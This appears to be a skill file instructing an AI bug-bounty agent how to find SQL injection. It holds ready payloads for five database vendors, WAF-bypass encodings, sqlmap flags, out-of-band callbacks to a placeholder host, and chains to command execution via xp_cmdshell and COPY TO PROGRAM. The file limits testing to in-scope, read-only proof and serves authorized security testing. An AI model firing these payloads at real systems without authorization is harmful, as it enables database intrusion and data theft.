---
name: hunt-sqli
description: Hunting skill for sqli vulnerabilities. Built from 12 public bug bounty reports including modern NoSQL injection (Rocket.Chat CVE-2021-22911 MongoDB $regex, Mongoose ORM CVE-2024-53900 $where bypass), modern ORM raw-fragment SQLi (Django CVE-2024-42005, Sequelize GHSA-wrh9-cjv3-2hpw), second-order SOQL injection (HackerOne Salesforce), time-based blind SQLi in GraphQL resolvers, and SQLi on OIDC-proxy backends. Use when hunting SQLi / NoSQLi on any target.
sources: github, hackerone_public, github_security_advisories, snyk_research, sonarsource_research
report_count: 12
---

# HUNT-SQLI — SQL injection

Operator injection into a SQL query. NoSQL operator injection is `hunt-nosqli` — use that skill when the body is JSON/BSON and the errors mention Mongo, Couch, or Elasticsearch. ORM "raw fragment" bugs (`.raw()`, `.literal()`, `.extra()`, `order`/`sort` identifiers, JSON-path aliases) are still this skill.

## Rails
- In-scope only. Read-only by default. A single proof query is the active test.
- No brute force, credential stuffing, password cracking, or keyspace exhaustion. A boolean oracle that recovers **one** value is the proof — do not walk every row.
- No `DROP`/`DELETE`/`UPDATE`, no heavy `BENCHMARK`/`RANDOMBLOB`, no `--os-shell`, no full `--dump`. Prove once and stop.
- Stop at draft. Never auto-submit.
- Claim only the rows you actually extracted. An error string with no vendor data and no oracle is not SQLi impact.

## Decision tree

1. **Inventory sinks.** Every string the server can concatenate: query, body, JSON field, GraphQL argument, cookie, `User-Agent`/`Referer`/`X-Forwarded-For`, path segment, filename, **sort/order/group/columns/fields**, `limit`/`offset`, webhook id, SOAP/XML text node.
2. **Baseline.** Save status, length, a stable body marker, and time for a known-good value.
3. **Break then repair.** Send `'` and `"` (and `)` if the value sits in parentheses). A SQL error or a body change that **returns to baseline** when you send `''` or `')` is a syntax signal. A WAF 403 on the quote alone is not.
4. **Branch:**
   - Vendor error text (`you have an error in your sql syntax`, `PSQLException`, `ORA-`, `SQLITE_ERROR`, `Unclosed quotation`, `org.hibernate`, `SQLServerException`) → **error-based** payload for that vendor. One value (`version()` / `@@version` / `sqlite_version()`).
   - No error, but true/false pair changes the body → **boolean**. Body-diff, not status alone.
   - No body diff → **time**. Interleaved n≥10. Or **OOB** one unique hostname.
   - Identifier sink (`ORDER BY`, column picker) → boolean `CASE`/`IF` inside the identifier, not a quoted string payload.
5. **Context.** Numeric (`id=1 AND 1=1`) vs quoted string vs `LIKE` vs `IN (...)` vs JSON/XML. Match the closer (`-- -`, `#`, `*/`).
6. **Second order.** If step 3 is clean on the write, store the payload (name, address, filename, webhook) and trigger the *other* feature that reads it back into SQL (admin search, export, password reset, report).
7. **Stop** when one non-public value comes back (database version, current database, or a single cell from a table you can name). Do not dump the schema.

Fingerprint the vendor from the error, `X-Powered-By`, a stack trace, or the function that works. Do not lock onto MySQL because the app is PHP.

| Vendor | Error (one cell) | Boolean pair | Time (prefer 1–2s) | OOB (one callback) |
|---|---|---|---|---|
| MySQL / MariaDB | `' AND extractvalue(1,concat(0x7e,version()))-- -` (error text is capped at 32 chars — a truncated version is still a hit) | `' AND 1=1-- -` / `' AND 1=2-- -` | `' AND SLEEP(2)-- -`. If the keyword is filtered but functions work: `' AND IF(1=1,SLEEP(2),0)-- -`. **`GET_LOCK('h',2)` is not a timer** — it returns immediately when the name is free; do not use it, and do not use `BENCHMARK` | Windows only: `LOAD_FILE` of a UNC path to `UNIQUE.collab` |
| PostgreSQL | `' AND 1=cast(version() as int)--` | `' AND 1=1--` / `' AND 1=2--` | `' AND 1=(SELECT 1 FROM pg_sleep(2))--` | `COPY ... TO PROGRAM` is OS exec — only after SQLi is proven, one `curl` to your host, no shell |
| MSSQL | `' AND 1=convert(int,@@version)--` | `' AND 1=1--` / `' AND 1=2--` | `' AND 1=1 WAITFOR DELAY '0:0:2'--` (same statement; no `;` required). `'; WAITFOR DELAY '0:0:2'--` only if stacked queries are on | `'; EXEC master..xp_dirtree '\\\\UNIQUE.collab\\a'--` |
| Oracle | `' AND 1=utl_inaddr.get_host_address((SELECT user FROM dual))--` (error text contains the value) | `' AND 1=1--` / `' AND 1=2--` | `' AND DBMS_PIPE.RECEIVE_MESSAGE('a',2)=1--` (timeout returns 1) | `utl_http.request('http://UNIQUE.collab/')` if the ACL allows it |
| SQLite | `' AND 1=cast(sqlite_version() as int)--` | `' AND 1=1--` / `' AND 1=2--` | none — do not use huge `RANDOMBLOB` | n/a |

`-- -` (dash, space, dash) is the MySQL-safe comment. `#` also works on MySQL. Postgres/MSSQL/Oracle accept `--`. Oracle `ORA-24247` means the ACL blocked `utl_inaddr` / `utl_http` — the injection still fired. Fall back to the boolean pair. Do not treat that error as "not SQLi".

## Where it shows up
- Search, filter, report, export, autocomplete, typeahead.
- `sort`, `order`, `dir`, `column`, `fields` — identifiers cannot be bound parameters. Probe: `sort=name` vs `sort=name,name` vs `sort=(CASE WHEN 1=1 THEN name ELSE price END)`.
- GraphQL: argument inlined into SQL. `query { item(id: "1' AND SLEEP(2)-- -") { name } }` and the same in a JSON variable.
- ORM raw: Django `.extra()` / `.raw()` / `JSONField` key passed to `.values()` (CVE-2024-42005 class — a key becomes a column alias). Sequelize `sequelize.literal` / `order: [[''+user, 'ASC']]` (GHSA-wrh9-cjv3-2hpw class). SQLAlchemy `text()`, Hibernate `${}` in HQL, Prisma `$queryRawUnsafe`, Knex `.orderByRaw`, EF Core `FromSqlRaw`.
- SOQL (Salesforce): a quote in a user string concatenated into `WHERE`. Error mentions `MALFORMED_QUERY` / `unexpected token`. Same true/false discipline. No SQL functions.
- HPP and mixed content-types: `id=1&id=1'`, JSON body to an endpoint that also accepts form-urlencoded.
- Cookie and header values stored then queried (tracking pixel, invite code, OIDC `code`).

## Payloads

**Syntax polyglot** (classify quote vs paren; compare to baseline):
```
'
''
"
`)
')
'))
'-- -
' AND 'a'='a
' AND 'a'='b
```

**UNION** only after boolean or error confirms injection. Count columns with `ORDER BY 1` … `ORDER BY n` until the sort errors, then:
```
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT version(),NULL-- -
```
Shift `version()` across columns until it is reflected. One cell. Stop. `information_schema` is optional and only a single `LIMIT 1` if you must name a table to explain impact.

**Identifier / ORDER BY** (no quotes around the column):
```
(CASE WHEN (1=1) THEN name ELSE price END)
(CASE WHEN (SUBSTRING(version(),1,1)='5') THEN name ELSE price END)
```

**Second order:** register or save `x'||version()||'` / `x'` then open the admin list, the invoice PDF, or the "forgot password" lookup that re-reads the row.

**WAF bypass** (try in this order; stop when the oracle returns):
- Case and comments: `Un/**/Ion SeLeCt`, MySQL `/*!50000UNION*/`, `/**/` as space, `%0a`/`%09`/`+` as space.
- No keyword: `||` / `&&` instead of `OR`/`AND` where the grammar allows; `LIKE` instead of `=`.
- Encoding: URL-encode once, twice if the app decodes twice (`%2527`). JSON `\u0027` for a quote.
- Strings: `CHAR(49)` / `CHR(49)` / `0x31` instead of `'1'`.
- Parentheses and comments to eat a trailing clause: `') OR 1=1-- -`.
- GBK/Big5 multibyte: `%bf%27` when the connection charset is not utf8mb4 (legacy PHP). Rare; only if a normal quote is escaped but the request charset is GBK.

Chunked `Transfer-Encoding` to split a body is a smuggling trick (`hunt-http-smuggling`), not a SQLi bypass by itself. Use it only when a WAF 403s the raw body and the origin still parses the parameter.

## Validation

| You saw | It means | Do next |
|---|---|---|
| Quote changes length, `''` restores baseline | Syntax influence | Vendor probe |
| Error contains `version()` output or a table cell | Proven extraction | Stop |
| True payload body ≠ false payload body, stable across 3 repeats, marker you injected is not the only diff | Boolean oracle | Read one value |
| Time: n≥10 interleaved (sleep 0 vs sleep 2). Means must separate (Welch t > 3 or non-overlapping ranges). One slow response is jitter | Blind SQLi | One OOB or one bit, then stop |
| DNS/HTTP hit on `UNIQUE.collab` whose label includes the value | OOB extraction | Stop |
| WAF 403, or error that does not contain query data, or only your own string echoed | Not proven | Do not report SQLi |

`sqlmap` / `ghauri` optional, and only on a request you already confirmed: `--technique` matching that channel, `--batch`, a single `--sql-query` for version. Never `--dump`, `--os-shell`, `--file-write`, `--risk=3`.

Auth-bypass via `' OR '1'='1` counts only if the response sets a session that loads an authenticated page as a specific user. Say which user. A 200 login page is not a bypass.

## Chains
- **`hunt-rce`** — only after read is proven and only one command: Postgres `COPY ... FROM PROGRAM` / `TO PROGRAM`, MSSQL `xp_cmdshell` if already enabled (do not enable it), MySQL `INTO OUTFILE` only if you can show the file is served. Prefer an OOB `id` over a shell.
- **`hunt-idor`** — one id or token read from a table, then a single request as the other user. Do not harvest the user table.
- **`hunt-auth-bypass`** — reset-token row readable or writable → one token for an account you control, or a documented admin token if the program allows it. Rocket.Chat CVE-2021-22911 class is a `$regex` oracle; that is `hunt-nosqli`.
- **`hunt-ssrf`** — Oracle `UTL_HTTP`, MySQL `LOAD_FILE` on a UNC, MSSQL `xp_dirtree` are already the OOB proof.

Known shapes (do not copy a report id you have not opened): Django JSONField alias injection CVE-2024-42005; Sequelize identifier interpolation GHSA-wrh9-cjv3-2hpw; invite-code string concat into Postgres (Mozilla H1 #2209130 class); Mongoose `$where` is NoSQL (CVE-2024-53900).

## Before you report — dedup gate

Fresh/changed surface first (see `dedup-novelty`, `changed-js-deepdive`), and hunt classes in yield
order (`/yield`). Before drafting ANY finding from this skill, run the dedup gate:

```bash
python3 engine/dedup.py check --program <program> --class <class> --url "<endpoint>" --title "<title>"
```

`NOVEL` -> proceed to `/validate`. `LIKELY_DUP` -> stop unless you can prove a concrete differentiator
(different endpoint/param/impact, or a bypass of the deployed fix -> report as a regression).
